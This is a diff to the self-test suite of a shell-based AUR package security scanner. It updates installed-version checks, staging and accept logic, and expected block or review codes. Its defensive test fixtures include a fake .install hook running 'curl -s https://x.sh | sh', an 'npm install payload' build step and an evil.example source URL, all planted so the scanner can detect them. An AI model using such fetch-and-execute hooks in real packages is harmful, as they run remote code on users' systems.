     [ -n "$_AUR_TEST_Q" ] || return 1
     [ "$1" = "${_AUR_TEST_Q%% *}" ] && printf '%s\n' "$_AUR_TEST_Q"
   }
+  local _AUR_TEST_LOCAL=""
+  # shellcheck disable=SC2329  # test seam, called indirectly by _installed_matches
+  _pacman_local_record() {
+    [ -n "$_AUR_TEST_LOCAL" ] || return 1
+    [ "$1" = "${_AUR_TEST_LOCAL%%$'\t'*}" ] && printf '%s\n' "$_AUR_TEST_LOCAL"
+  }
   # shellcheck disable=SC2329  # test seam, called indirectly by cmd_accept
   find_pkg_dir() { [ -n "$_AUR_TEST_DIR" ] && printf '%s\n' "$_AUR_TEST_DIR" || return 1; }
+  local _AUR_TEST_PKGBASE=""
   # shellcheck disable=SC2329  # test seam, called indirectly by _clone_aur
   # NAME-AWARE: remap only the configured split-member name to its pkgbase.
   # All other names pass through unchanged (pkgname == pkgbase for non-split
@@ -2274,31 +2909,35 @@ cmd_selftest() {
   printf 'pkgbase = test-acc\n\tpkgver = 1.2\n\tpkgrel = 3\n\npkgname = test-acc\n' >"$_tmp/.SRCINFO"
   git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm acc >/dev/null
   _tsha=$(git -C "$_tmp" rev-parse HEAD)
-  _AUR_TEST_Q="test-acc 1.2-3"
-  ta "installed-nonsplit-match"    0 _installed_matches "$_tmp" "$_tsha"
-  _AUR_TEST_Q="test-acc 1.2-2"
-  ta "installed-nonsplit-mismatch" 1 _installed_matches "$_tmp" "$_tsha"
-  _AUR_TEST_Q=""
-  ta "installed-nonsplit-absent"   1 _installed_matches "$_tmp" "$_tsha"
+  _AUR_TEST_LOCAL=$'test-acc\t1.2-3\ttest-acc\t4102444800'
+  ta "installed-nonsplit-match"    0 _installed_matches "$_tmp" "$_tsha" test-acc 0
+  _AUR_TEST_LOCAL=$'test-acc\t1.2-2\ttest-acc\t4102444800'
+  ta "installed-nonsplit-mismatch" 1 _installed_matches "$_tmp" "$_tsha" test-acc 0
+  _AUR_TEST_LOCAL=""
+  ta "installed-nonsplit-absent"   1 _installed_matches "$_tmp" "$_tsha" test-acc 0
+  _AUR_TEST_LOCAL=$'test-acc\t1.2-3\ttest-acc\t100'
+  ta "installed-predates-stage"    1 _installed_matches "$_tmp" "$_tsha" test-acc 101
+  _AUR_TEST_LOCAL=$'test-acc\t1.2-3\ttest-acc\t100\t4102444800'
+  ta "installed-build-predates-stage" 1 _installed_matches "$_tmp" "$_tsha" test-acc 101
 
   # non-split + epoch (epoch in global section, tab-indented)
   printf 'pkgbase = test-ep\n\tpkgver = 1\n\tpkgrel = 1\n\tepoch = 2\n\npkgname = test-ep\n' >"$_tmp/.SRCINFO"
   git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm ep >/dev/null
   _epsha=$(git -C "$_tmp" rev-parse HEAD)
-  _AUR_TEST_Q="test-ep 2:1-1"
-  ta "installed-epoch-match"    0 _installed_matches "$_tmp" "$_epsha"
-  _AUR_TEST_Q="test-ep 1-1"
-  ta "installed-epoch-mismatch" 1 _installed_matches "$_tmp" "$_epsha"
+  _AUR_TEST_LOCAL=$'test-ep\t2:1-1\ttest-ep\t4102444800'
+  ta "installed-epoch-match"    0 _installed_matches "$_tmp" "$_epsha" test-ep 0
+  _AUR_TEST_LOCAL=$'test-ep\t1-1\ttest-ep\t4102444800'
+  ta "installed-epoch-mismatch" 1 _installed_matches "$_tmp" "$_epsha" test-ep 0
 
   # MALFORMED file with no pkgname= at all (a corrupted/manual .SRCINFO).
   # Exercises the pkgbase= defensive fallback.
   printf 'pkgbase = test-fb\n\tpkgver = 9\n\tpkgrel = 1\n' >"$_tmp/.SRCINFO"
   git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm fb >/dev/null
   _fbsha=$(git -C "$_tmp" rev-parse HEAD)
-  _AUR_TEST_Q="test-fb 9-1"
-  ta "installed-fallback-match"    0 _installed_matches "$_tmp" "$_fbsha"
-  _AUR_TEST_Q="test-fb 9-2"
-  ta "installed-fallback-mismatch" 1 _installed_matches "$_tmp" "$_fbsha"
+  _AUR_TEST_LOCAL=$'test-fb\t9-1\ttest-fb\t4102444800'
+  ta "installed-malformed-no-pkgname" 1 _installed_matches "$_tmp" "$_fbsha" test-fb 0
+  _AUR_TEST_LOCAL=$'test-fb\t9-2\ttest-fb\t4102444800'
+  ta "installed-malformed-mismatch"   1 _installed_matches "$_tmp" "$_fbsha" test-fb 0
 
   # SPACE-INDENTED .SRCINFO (real-world: opera-developer ships 8-space indent
   # instead of tabs). The parser must tolerate leading whitespace on attribute
@@ -2307,10 +2946,10 @@ cmd_selftest() {
   printf 'pkgbase = test-sp\n        pkgver = 4.4\n        pkgrel = 1\n\npkgname = test-sp\n' >"$_tmp/.SRCINFO"
   git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm sp >/dev/null
   _spsha=$(git -C "$_tmp" rev-parse HEAD)
-  _AUR_TEST_Q="test-sp 4.4-1"
-  ta "installed-spaceindent-match"    0 _installed_matches "$_tmp" "$_spsha"
-  _AUR_TEST_Q="test-sp 4.4-2"
-  ta "installed-spaceindent-mismatch" 1 _installed_matches "$_tmp" "$_spsha"
+  _AUR_TEST_LOCAL=$'test-sp\t4.4-1\ttest-sp\t4102444800'
+  ta "installed-spaceindent-match"    0 _installed_matches "$_tmp" "$_spsha" test-sp 0
+  _AUR_TEST_LOCAL=$'test-sp\t4.4-2\ttest-sp\t4102444800'
+  ta "installed-spaceindent-mismatch" 1 _installed_matches "$_tmp" "$_spsha" test-sp 0
 
   # SPLIT package, pkgbase != pkgnames (the case that broke the old parser: it
   # queried pkgbase, which is never an installable split sub-package name).
@@ -2319,24 +2958,49 @@ cmd_selftest() {
   git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm split >/dev/null
   _splsha=$(git -C "$_tmp" rev-parse HEAD)
   # only the 2nd sub-package installed → must match via that pkgname
-  _AUR_TEST_Q="test-split-tools 7-1"
-  ta "installed-split-2nd-pkg"  0 _installed_matches "$_tmp" "$_splsha"
+  _AUR_TEST_LOCAL=$'test-split-tools\t7-1\ttest-split\t4102444800'
+  ta "installed-split-2nd-pkg"  0 _installed_matches "$_tmp" "$_splsha" test-split 0
   # only the 3rd sub-package installed
-  _AUR_TEST_Q="test-split-docs 7-1"
-  ta "installed-split-3rd-pkg"   0 _installed_matches "$_tmp" "$_splsha"
-  # pkgbase itself "installed" is NOT a valid sub-package match (pkgbase != any pkgname)
-  _AUR_TEST_Q="test-split 7-1"
-  ta "installed-split-pkgbase-not-pkg" 1 _installed_matches "$_tmp" "$_splsha"
-  _AUR_TEST_Q=""
-  ta "installed-split-none"        1 _installed_matches "$_tmp" "$_splsha"
+  _AUR_TEST_LOCAL=$'test-split-docs\t7-1\ttest-split\t4102444800'
+  ta "installed-split-3rd-pkg"   0 _installed_matches "$_tmp" "$_splsha" test-split 0
+  # A package named like the pkgbase is not one of the declared split members.
+  _AUR_TEST_LOCAL=$'test-split\t7-1\ttest-split\t4102444800'
+  ta "installed-split-pkgbase-not-pkg" 1 _installed_matches "$_tmp" "$_splsha" test-split 0
+  _AUR_TEST_LOCAL=""
+  ta "installed-split-none"        1 _installed_matches "$_tmp" "$_splsha" test-split 0
+
+  # Finding F regression: attacker-authored .SRCINFO names an unrelated,
+  # already-installed package at a matching version. The local DB says that
+  # package belongs to base "glibc", not this staged base, so it cannot confirm
+  # or promote the staged commit.
+  printf 'pkgbase = test-foreign\n\tpkgver = 2.41\n\tpkgrel = 1\n\npkgname = glibc\n' >"$_tmp/.SRCINFO"
+  git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm foreign
+  _foreignsha=$(git -C "$_tmp" rev-parse HEAD)
+  _AUR_TEST_LOCAL=$'glibc\t2.41-1\tglibc\t4102444800'
+  ta "installed-foreign-srcinfo-rejected" 1 \
+    _installed_matches "$_tmp" "$_foreignsha" test-foreign 0
+
+  # epoch=0 is omitted by pacman; normalize it exactly like an absent epoch.
+  printf 'pkgbase = test-zeroep\n\tpkgver = 3\n\tpkgrel = 2\n\tepoch = 0\n\npkgname = test-zeroep\n' >"$_tmp/.SRCINFO"
+  git -C "$_tmp" add -A && git -C "$_tmp" -c user.email=t@t -c user.name=t commit -qm zeroep
+  _zeroepsha=$(git -C "$_tmp" rev-parse HEAD)
+  _AUR_TEST_LOCAL=$'test-zeroep\t3-2\ttest-zeroep\t4102444800'
+  ta "installed-epoch-zero-match" 0 \
+    _installed_matches "$_tmp" "$_zeroepsha" test-zeroep 0
 
   # accept promotion: reset HEAD to the test-acc commit, point origin/master at
   # it, stage, then accept with it confirmed installed → promoted (moved).
   git -C "$_tmp" update-ref refs/remotes/origin/master "$_tsha" 2>/dev/null || true
   git -C "$_tmp" checkout -q "$_tsha" -- .SRCINFO
   _AUR_TEST_DIR="$_tmp"
-  _AUR_TEST_Q="test-acc 1.2-3"
   write_ref "$_tmp" "$STAGED_DIR/test-acc"
+  _AUR_TEST_LOCAL=$'test-acc\t1.2-3\ttest-acc\t1\t1'
+  printf 'test-acc\n' >"$MANIFEST_FILE"
+  ta "accept-stale-build-skips" 0 cmd_accept
+  if [ -f "$STAGED_DIR/test-acc" ]; then
+    log "  $(c_green "PASS") accept-stale-build-leaves-staged"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") accept-stale-build-leaves-staged"; fail=$((fail+1)); fi
+  _AUR_TEST_LOCAL=$'test-acc\t1.2-3\ttest-acc\t4102444800'
   printf 'test-acc\n' >"$MANIFEST_FILE"
   ta "accept-promotes"          0 cmd_accept
   if [ -f "$ACCEPTED_DIR/test-acc" ] && [ ! -f "$STAGED_DIR/test-acc" ]; then
@@ -2344,7 +3008,7 @@ cmd_selftest() {
   else log "  $(c_red "FAIL") accept-moves-staged"; fail=$((fail+1)); fi
 
   # accept skips a package not installed at the staged version (anchor unchanged).
-  _AUR_TEST_Q=""
+  _AUR_TEST_LOCAL=""
   write_ref "$_tmp" "$STAGED_DIR/test-skip"
   printf 'test-skip\n' >"$MANIFEST_FILE"
   ta "accept-skips-absent"      0 cmd_accept
@@ -2361,9 +3025,9 @@ cmd_selftest() {
   # with NO scan — a malicious update sailed through ungated while the gate
   # printed "all clear". check_pkg now routes to missing_cache_gate: clone fresh,
   # and EITHER baseline-recover (diff installed-version..origin/master at full
-  # precision) OR fall back to a whole-file hard scan. These tests exercise the
+  # precision) OR fall back to mandatory whole-file review. These tests exercise the
   # FALLBACK tier (no installed version reported: _AUR_TEST_Q=""), which is
-  # review-level: hard hit → 2, clean → 0, clone fail → 2. The scan-time tip is
+  # review-level when scanned: hit/clean-without-baseline → 2; clone/read failure blocks (1). The scan-time tip is
   # staged so `accept` promotes the AUDITED commit (finding-1.2 TOCTOU fix).
   # Baseline-recovery tier is exercised in its own section below.
   log ""
@@ -2372,17 +3036,18 @@ cmd_selftest() {
   _fbx=$(mktemp -d); _fsd=$(mktemp -d)
   # build clean + malicious source repos, expose as bare <pkg>.git so the
   # "${AUR_URL}/${pkg}.git" clone URL in scan_clone resolves to a local path.
-  # Also a review-only fixture (pip) to prove scan_clone does NOT run review
-  # rules, and an evil-install fixture (payload in .install, not PKGBUILD) to
+  # Also a review-only fixture (pip) to prove tier 2 surfaces review rules
+  # for consent, and an evil-install fixture (payload in .install, not PKGBUILD) to
   # prove the sourced-script surface is scanned.
-  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/evil-install" "$_fbx/src/empty-pkg" "$_fbx/aur"
+  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/review-pip3" "$_fbx/src/evil-install" "$_fbx/src/empty-pkg" "$_fbx/aur"
   printf 'pkgname=clean-pkg\npkgver=1\npkgrel=1\nsource=("https://example.com/x.tar")\n' >"$_fbx/src/clean-pkg/PKGBUILD"
   printf 'pkgname=evil-pkg\npkgver=1\npkgrel=1\nbuild() { npm install payload; }\n' >"$_fbx/src/evil-pkg/PKGBUILD"
   printf 'pkgname=review-pkg\npkgver=1\npkgrel=1\nbuild() { pip install requests; }\n' >"$_fbx/src/review-pkg/PKGBUILD"
+  printf 'pkgname=review-pip3\npkgver=1\npkgrel=1\nbuild() { python3 -m pip install requests; }\n' >"$_fbx/src/review-pip3/PKGBUILD"
   printf 'pkgname=evil-install\npkgver=1\npkgrel=1\ninstall=evil.install\n' >"$_fbx/src/evil-install/PKGBUILD"
   printf 'post_install() { curl -s https://x.sh | sh; }\n' >"$_fbx/src/evil-install/evil.install"
   : >"$_fbx/src/empty-pkg/PKGBUILD"
-  for _p in clean-pkg evil-pkg review-pkg evil-install empty-pkg; do
+  for _p in clean-pkg evil-pkg review-pkg review-pip3 evil-install empty-pkg; do
     git -C "$_fbx/src/$_p" -c init.defaultBranch=master init -q
     git -C "$_fbx/src/$_p" add -A; git -C "$_fbx/src/$_p" -c user.email=t@t -c user.name=t commit -qm base
     git clone -q --bare "$_fbx/src/$_p" "$_fbx/aur/$_p.git"
@@ -2398,13 +3063,23 @@ cmd_selftest() {
   _AUR_TEST_DIR=""
   AUR_SAFE_STAGING=1
 
-  ta "uncached-clean-returns-ok"       0 check_pkg clean-pkg
+  ta "audit-new-install-stages" 0 cmd_audit clean-pkg
+  if [ -f "$STAGED_DIR/clean-pkg" ] && grep -qx clean-pkg "$MANIFEST_FILE"; then
+    log "  $(c_green "PASS") audit-new-install-stages-pkgbase"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") audit-new-install-stages-pkgbase"; fail=$((fail+1))
+  fi
+  rm -f "$STAGED_DIR/clean-pkg"
+  : >"$MANIFEST_FILE"
+
+  ta "uncached-clean-requires-review"  2 check_pkg clean-pkg
   ta "uncached-evil-returns-review"    2 check_pkg evil-pkg
-  ta "uncached-review-only-returns-ok" 0 check_pkg review-pkg
-  ta "uncached-install-hit-returns-2"  2 check_pkg evil-install
-  ta "uncached-empty-pkgbuild-review"  2 check_pkg empty-pkg
-  # clone failure (no such fixture) → review (consent), never silent passthrough
-  ta "uncached-clonefail-returns-review" 2 check_pkg nonexistent-pkg
+  ta "uncached-review-only-returns-review" 2 check_pkg review-pkg
+  ta "uncached-python-pip-returns-review"  2 check_pkg review-pip3
+  ta "uncached-install-hit-returns-2"      2 check_pkg evil-install
+  ta "uncached-empty-pkgbuild-block"   1 check_pkg empty-pkg
+  # clone failure (no such fixture) → block (zero signal is not consentable)
+  ta "uncached-clonefail-blocks"       1 check_pkg nonexistent-pkg
 
   # staging: clean + review-hit stage the scan-time tip; clone-fail does NOT.
   # Verifies the finding-1.2 TOCTOU fix on the missing-cache path: the audited
@@ -2478,7 +3153,7 @@ cmd_selftest() {
     '1.0@fp.install=post_install() { echo hi; }' \
     '2.0@fp.install=post_install() { echo hi; }'
   _AUR_TEST_Q="fp-pkg 1.0-1"
-  ta "baseline-fp-eliminated-clean" 0 check_pkg fp-pkg
+  ta "baseline-fp-reconstructed-review" 2 check_pkg fp-pkg
 
   # HARD HIT: a NEW curl|sh .install hook added in the delta (the campaign
   # vector) → block (1), mirroring the cached path (not review/2 like fallback).
@@ -2665,11 +3340,11 @@ cmd_selftest() {
   _AUR_TEST_DIR=""
   _AUR_TEST_Q="split-base-pkg-mem1 1.0-1"
   _AUR_TEST_PKGBASE="split-base-pkg-mem1 split-base-pkg"
-  ta "split-pkg-baseline-recovery-clean" 0 check_pkg split-base-pkg-mem1
+  ta "split-pkg-baseline-recovery-review" 2 check_pkg split-base-pkg-mem1
 
   # Staging keys by pkgbase (the trust-anchor identity), NOT pkgname. Without
   # this, accepted/<pkgname> is invisible to the cached path's pkgbase lookup,
-  # silently re-seeding the anchor on the next gate.
+  # losing the confirmed anchor on the next gate.
   if [ -f "$STAGED_DIR/$_sp_base" ] && [ ! -f "$STAGED_DIR/split-base-pkg-mem1" ]; then
     log "  $(c_green "PASS") split-pkg-stages-under-pkgbase"; pass=$((pass+1))
   else log "  $(c_red "FAIL") split-pkg-stages-under-pkgbase"; fail=$((fail+1)); fi
@@ -2687,8 +3362,8 @@ cmd_selftest() {
   # NEW version. cmd_accept must find_pkg_dir(pkgbase), confirm install, and
   # promote staged/<pkgbase> → accepted/<pkgbase>. Before the fix, staging was
   # under <pkgname> → find_pkg_dir(pkgname) failed (cache dir is pkgbase) →
-  # anchor NEVER advanced → re-seeded from cache HEAD next gate, silently
-  # discarding the audit. This is the single most security-critical operation;
+  # anchor NEVER advanced and every later gate lacked a confirmed baseline.
+  # This is the single most security-critical operation;
   # leaving it unverified on a trust-path change is not acceptable.
   # ACCEPTED_DIR is redirected to a temp dir because the missing-cache section
   # overrides only STATE_DIR/STAGED_DIR/MANIFEST_FILE, not ACCEPTED_DIR.
@@ -2698,12 +3373,13 @@ cmd_selftest() {
   # installed at the tip version (2.0-1, what the build just produced)
   _AUR_TEST_DIR="$_fbx/src/$_sp_base"
   _AUR_TEST_Q="split-base-pkg-mem1 2.0-1"
+  _AUR_TEST_LOCAL=$'split-base-pkg-mem1\t2.0-1\tsplit-base-pkg\t4102444800'
   ta "split-pkg-accept-promotes-pkgbase" 0 cmd_accept
   if [ -f "$ACCEPTED_DIR/$_sp_base" ] && [ ! -f "$STAGED_DIR/$_sp_base" ]; then
     log "  $(c_green "PASS") split-pkg-accept-moves-to-accepted"; pass=$((pass+1))
   else log "  $(c_red "FAIL") split-pkg-accept-moves-to-accepted"; fail=$((fail+1)); fi
   # accepted SHA must be the AUDITED tip (finding-1.2: the scanned commit,
-  # advanced only after install-confirmation) — never a re-seed from cache HEAD
+  # advanced only after install-confirmation) — never helper-cache HEAD
   if [ "$(awk -F'\t' '{print $1}' "$ACCEPTED_DIR/$_sp_base")" = "$_sp_tip" ]; then
     log "  $(c_green "PASS") split-pkg-accept-anchor-is-audited-tip"; pass=$((pass+1))
   else log "  $(c_red "FAIL") split-pkg-accept-anchor-is-audited-tip"; fail=$((fail+1)); fi
@@ -2711,10 +3387,10 @@ cmd_selftest() {
   ACCEPTED_DIR="$_osave_acc"
   _AUR_TEST_DIR=""
 
-  # Without resolution (no pkgbase map): clone of pkgname.git 404s → review (2),
-  # never silent passthrough — same safe-degradation as uncached-clonefail above.
+  # Without resolution (no pkgbase map): clone of pkgname.git 404s → block (1),
+  # never consentable passthrough — same policy as uncached clonefail above.
   _AUR_TEST_PKGBASE=""
-  ta "split-pkg-no-resolution-clonefail" 2 check_pkg split-base-pkg-mem1
+  ta "split-pkg-no-resolution-clonefail" 1 check_pkg split-base-pkg-mem1
 
   # restore seam state for subsequent test sections
   _AUR_TEST_PKGBASE=""
@@ -2733,6 +3409,7 @@ cmd_selftest() {
   git -C "$_dfx/src/df-pkg" add -A
   git -C "$_dfx/src/df-pkg" -c user.email=t@t -c user.name=t commit -qm base
   git -C "$_dfx/src/df-pkg" branch -qM master
+  git -C "$_dfx/src/df-pkg" remote add origin "file://$_dfx/src/df-pkg"
   git -C "$_dfx/src/df-pkg" update-ref refs/remotes/origin/master HEAD
   _dfsha=$(git -C "$_dfx/src/df-pkg" rev-parse HEAD)
   if ( cd "$_dfx/src/df-pkg" && diff_added "0000000000000000000000000000000000000000..HEAD" >/dev/null ); then
@@ -2740,13 +3417,25 @@ cmd_selftest() {
   else
     log "  $(c_green "PASS") diff-added-bad-ref-fails"; pass=$((pass+1))
   fi
+  if files_with_status A '.install' "$_dfx/src/df-pkg" \
+      0000000000000000000000000000000000000000 >/dev/null; then
+    log "  $(c_red "FAIL") files-status-bad-ref-fails"; fail=$((fail+1))
+  else
+    log "  $(c_green "PASS") files-status-bad-ref-fails"; pass=$((pass+1))
+  fi
+  if _valid_pkg_name '..' || _valid_pkg_name '.git'; then
+    log "  $(c_red "FAIL") hidden-package-names-rejected"; fail=$((fail+1))
+  else
+    log "  $(c_green "PASS") hidden-package-names-rejected"; pass=$((pass+1))
+  fi
+  ta "invalid-dot-pkg-blocks" 1 check_pkg ..
   local _sdrc
   scan_diff_rules df-pkg "$_dfx/src/df-pkg" "0000000000000000000000000000000000000000" >/dev/null
   _sdrc=$?
-  if [ "$_sdrc" -eq 2 ]; then
-    log "  $(c_green "PASS") scan-diff-bad-ref-review"; pass=$((pass+1))
+  if [ "$_sdrc" -eq 1 ]; then
+    log "  $(c_green "PASS") scan-diff-bad-ref-blocks"; pass=$((pass+1))
   else
-    log "  $(c_red "FAIL") scan-diff-bad-ref-review (expected rc 2, got $_sdrc)"; fail=$((fail+1))
+    log "  $(c_red "FAIL") scan-diff-bad-ref-blocks (expected rc 1, got $_sdrc)"; fail=$((fail+1))
   fi
   local _df_sd _df_ad _df_st _df_mf
   _df_sd="$STATE_DIR"; STATE_DIR="$_dfs"
@@ -2758,7 +3447,7 @@ cmd_selftest() {
     >"$ACCEPTED_DIR/df-pkg"
   _AUR_TEST_DIR="$_dfx/src/df-pkg"
   AUR_SAFE_STAGING=1
-  ta "corrupt-anchor-returns-review" 2 check_pkg df-pkg
+  ta "corrupt-anchor-blocks" 1 check_pkg df-pkg
   if [ ! -f "$STAGED_DIR/df-pkg" ]; then
     log "  $(c_green "PASS") corrupt-anchor-no-stage"; pass=$((pass+1))
   else log "  $(c_red "FAIL") corrupt-anchor-no-stage"; fail=$((fail+1)); fi
@@ -2865,8 +3554,15 @@ cmd_selftest() {
 
   local _sum1 _sum2 _old_src _new_src _old_basic _new_basic _old_multi_sum_pkg _new_multi_sum_pkg _old_space_src _new_tab_src
   local _sum2_pkg _sum2_src _host_pkg _host_src _evil_pkg _evil_src _edge_pkgbuild
+  local _quoted_source_old_pkg _quoted_source_new_pkg _quoted_source_old_src _quoted_source_new_src
   local _old_opt_pkg _new_opt_pkg _new_opt_expansion_pkg _new_opt_sed_pkg _old_opt_src _new_opt_src
-  local _old_vpgp_pkg _new_vpgp_pkg _old_vpgp_src _new_vpgp_src _old_src_move_src _new_src_move_src
+  local _old_dep_pkg _old_stray_dep_pkg _new_repo_dep_pkg _new_aur_dep_pkg _new_expansion_dep_pkg _new_stray_dep_pkg
+  local _old_dup_dep_pkg _new_dup_dep_pkg _new_inline_stray_dep_pkg
+  local _old_dep_src _new_repo_dep_src _new_aur_dep_src _new_dup_dep_src
+  local _old_vpgp_pkg _new_vpgp_pkg _comment_vpgp_old_pkg _comment_vpgp_new_pkg
+  local _inline_vpgp_old_pkg _inline_vpgp_new_pkg _quoted_hash_old_pkg _quoted_hash_new_pkg
+  local _quoted_gadget_old_pkg _quoted_gadget_new_pkg
+  local _old_vpgp_src _new_vpgp_src _old_src_move_src _new_src_move_src
   # split-pkgbase intra-pkgbase-dep fixtures (R1)
   local _split_old_pkgbuild _split_new_pkgbuild _split_base_old_src _split_base_new_src
   local _split_member_old_src _split_member_new_src _split_added_old_src _split_added_new_src
@@ -2902,12 +3598,29 @@ cmd_selftest() {
   printf -v _evil_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=("https://evil.example/pkg-2.tar")\nsha256sums=(%s)' "$_sum2"
   _evil_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tsource = https://evil.example/pkg-2.tar\n\tsha256sums = '"$_sum2"$'\n\npkgname = cls-pkg'
   printf -v _edge_pkgbuild 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=(\n  "https://example.com/pkg-2.tar"\n)\nsha256sums=(%s)' "$_sum2"
+  printf -v _quoted_source_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=(\n  "foo-1.0.tar.gz"\n)\nsha256sums=(%s)' "$_sum1"
+  printf -v _quoted_source_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=(\n  "foo-1.1.tar.gz"\n)\nsha256sums=(%s)' "$_sum2"
+  _quoted_source_old_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tsource = foo-1.0.tar.gz\n\tsha256sums = '"$_sum1"$'\n\npkgname = cls-pkg'
+  _quoted_source_new_src=$'pkgbase = cls-pkg\n\tpkgver = 1.1\n\tpkgrel = 1\n\tsource = foo-1.1.tar.gz\n\tsha256sums = '"$_sum2"$'\n\npkgname = cls-pkg'
   printf -v _old_opt_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)\noptdepends=(\n  'ntfs-3g: NTFS partition support'\n)" "$_sum1"
   printf -v _new_opt_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)\noptdepends=(\n  'ntfsprogs: NTFS partition support'\n)" "$_sum1"
   printf -v _new_opt_expansion_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\noptdepends=(\n  "$(printf ntfsprogs): NTFS partition support"\n)' "$_sum1"
   printf -v _new_opt_sed_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)\noptdepends=(\n  'ntfsprogs: NTFS partition support'\n)\nprepare() {\n  # Correct package name containing ntfsresize\n  sed -i 's/ntfs-3g/ntfsprogs/g' tool/VentoyWorker.sh\n}" "$_sum1"
   _old_opt_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\toptdepends = ntfs-3g: NTFS partition support\n\npkgname = cls-pkg'
   _new_opt_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\toptdepends = ntfsprogs: NTFS partition support\n\npkgname = cls-pkg'
+  printf -v _old_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(\n  'old-aur-dep'\n)\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _new_repo_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(\n  'alsa-lib'\n)\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _new_aur_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(\n  'suspicious-aur-dep'\n)\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _new_expansion_dep_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(\n  "$(printf alsa-lib)"\n)\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)' "$_sum1"
+  printf -v _old_stray_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nmakedepends=()\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _new_stray_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nmakedepends=()\n  'alsa-lib'\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _old_dup_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(\n  'old-aur-dep'\n)\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _new_dup_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=(\n  'old-aur-dep'\n  'alsa-lib'\n)\n  'alsa-lib'\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  printf -v _new_inline_stray_dep_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\ndepends=()\n  'alsa-lib'\nsource=(\"https://example.com/pkg-1.tar\")\nsha256sums=(%s)" "$_sum1"
+  _old_dep_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tdepends = old-aur-dep\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\npkgname = cls-pkg'
+  _new_repo_dep_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tdepends = alsa-lib\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\npkgname = cls-pkg'
+  _new_aur_dep_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tdepends = suspicious-aur-dep\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\npkgname = cls-pkg'
+  _new_dup_dep_src="$_old_dep_src"$'\n\tdepends = alsa-lib'
   _old_space_src=$'pkgbase = cls-pkg\n        pkgver = 1.0\n        pkgrel = 1\n        provides = cls-virtual\n        conflicts = cls-old\n        options = !strip\n        backup = etc/cls.conf\n\npkgname = cls-pkg'
   _new_tab_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tprovides = cls-virtual\n\tconflicts = cls-old\n\toptions = !strip\n\tbackup = etc/cls.conf\n\npkgname = cls-pkg'
   # Test fixtures for validpgpkeys hex bypass (finding E): baseline has a
@@ -2920,6 +3633,14 @@ cmd_selftest() {
   printf -v _new_vpgp_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nvalidpgpkeys=("' "$_sum1"
   _new_vpgp_pkg+="  0123456789ABCDEF0123456789ABCDEF01234567"
   _new_vpgp_pkg+=$'\n  \'"FEDCBA9876543210FEDCBA9876543210FEDCBA98'"\n)\n"
